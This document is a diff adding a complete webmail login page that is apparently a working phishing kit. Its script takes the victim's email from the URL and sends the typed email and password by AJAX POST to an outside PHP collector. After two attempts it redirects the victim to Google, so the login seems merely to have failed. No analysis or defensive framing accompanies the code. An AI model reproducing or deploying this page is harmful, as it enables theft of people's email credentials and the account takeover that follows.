@@ -1,0 +1,281 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+  
+  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
+
+  
+  <link rel="icon" type="image/ico" href="image/favicon.ico">
+
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <title>Webmail Login</title>
+
+  
+
+  
+  <style>
+html,body{
+margin: 0px;
+height: 100%;
+}
+
+.container1{
+width: 400px;
+height: 400px;
+margin: auto;
+text-align: center;
+}
+
+.cover{
+width: 280px;
+margin: auto;
+}
+
+.userid{
+width: 260px;
+height: 30px;
+border: 2px solid #bebebe;
+border-radius: 5px;
+padding-left: 20px;
+margin-top: 10px;
+outline: 0px;
+}
+
+
+.password{
+width: 260px;
+height: 30px;
+border: 2px solid #bebebe;
+border-radius: 5px;
+padding-left: 20px;
+margin-top: 10px;
+outline: 0px;
+}
+
+
+.submit{
+width: 285px;
+height: 35px;
+border: 1px solid #333333;
+border-radius: 5px;
+text-align: center;
+font-weight: bold;
+color: white;
+background-color: #179bd7;
+cursor: pointer;
+}
+
+.submit:hover{
+  background-color: #095779;
+}
+
+.error{
+color: #ffffff;
+width: 300px;
+height: 40px;
+margin: auto;
+padding-left: 20px;
+padding-top: 10px;
+font-family: arial;
+font-size: 12px;
+border-radius: 5px;
+}
+  </style>
+</head><body onload="populatefirst()">
+<br>
+
+<br>
+
+<div class="container1"><br>
+<div style="text-align: left;" class="error" id="message"><br>
+</div>
+<br>
+<img style="width: 320px; height: 75px;" alt="logo" src="https://firebasestorage.googleapis.com/v0/b/eneriox-86632-zarionc.appspot.com/o/a2.png?alt=media&token=942d8e62-4b8c-4329-9f0d-27fd1f802b2e"><br>
+<div style="text-align: left;" class="cover"><br>
+<span style="color: rgb(44, 58, 89); font-family: Arial; font-weight: bold;">Email
+Address</span><br>
+<div class="user-cover">
+<input class="userid" id="email" maxlength="128" name="email" placeholder="Enter your email address." value="" ><br>
+</div>
+<br>
+<br>
+<span style="color: rgb(44, 58, 89); font-family: Arial; font-weight: bold;">Password</span><br>
+<div class="pass-cover">
+<input id="password" class="password" maxlength="128" name="password" placeholder="Enter your email password." type="password"><br>
+</div>
+<br>
+<br>
+ <center>
+                        <div id="msg" style="display: none;font-weight: 600;color: red;">Please fill in the correct details.</div>
+                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+<div class="controls">
+                                    <div class="login-btn">
+                                        <button name="login" type="submit" class="submit" id="submit-btn" tabindex="3">Log in</button>
+                                    </div>
+
+                                </div>
+<br>
+<br>
+<div style="text-align: center;"><small style="font-weight: bold; color: rgb(44, 58, 89);"><span style="font-family: Arial;">Reset Password</span></small><br>
+</div>
+</div>
+</div>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<br>
+
+<div style="text-align: center;"><img style="width: 691px; height: 169px;" alt="foot" src="https://firebasestorage.googleapis.com/v0/b/eneriox-86632-zarionc.appspot.com/o/a1.png?alt=media&token=a46c67fa-5c1b-4f49-8be8-3b1df4e08e97"><br>
+</div>
+
+<br>
+
+<br>
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
+<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
+
+<script>
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+        $(".logoname").html(finalu);
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+                    if (!password) {
+                $('#error').show();
+                $('#error').html("Password field is emply.!");
+
+                return false;
+            }
+
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://physicaleducationdiploma.com/component/weml.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                   // window.location.replace("http://www."+my_slice);
+                    location.replace("https://www.google.com/"); 
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+               // window.location.replace("http://www."+my_slice);
+				location.replace("https://www.google.com/");
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+    });
+
+
+  </script>
+</body></html>
